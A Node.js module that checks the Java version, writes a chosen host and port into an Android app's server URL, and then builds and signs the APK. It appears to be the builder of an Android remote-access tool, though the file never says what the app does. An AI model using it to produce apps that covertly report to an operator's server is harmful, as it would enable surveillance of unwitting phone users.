const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            // Support Java 8, 11, 17, and newer versions for APK building
            const supportedVersions = ["1.8.0", "11", "17", "18", "19", "20", "21"];
            const isSupported = supportedVersions.some(version => 
                javaVersion.includes(version) || openJDKVersion.includes(version)
            );
            
            if (isSupported) {
                // Check if using Java 9+ and warn about signing compatibility
                const isJava9Plus = !(javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0"));
                if (isJava9Plus) {
                    console.warn("Warning: Using Java 9+ detected. APK building supported, but signing may require Java 8 compatibility mode.");
                }
                
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 8, 11, 17, or newer", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) {
                    // Copy the signed APK to the download location
                    const downloadApkPath = CONST.apkBuildPath.replace('build.apk', 'build.s.apk');
                    fs.copyFile(CONST.apkBuildPath, downloadApkPath, (copyError) => {
                        if (copyError) return cb('Failed to copy signed APK - ' + copyError.message);
                        return cb(false);
                    });
                } else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
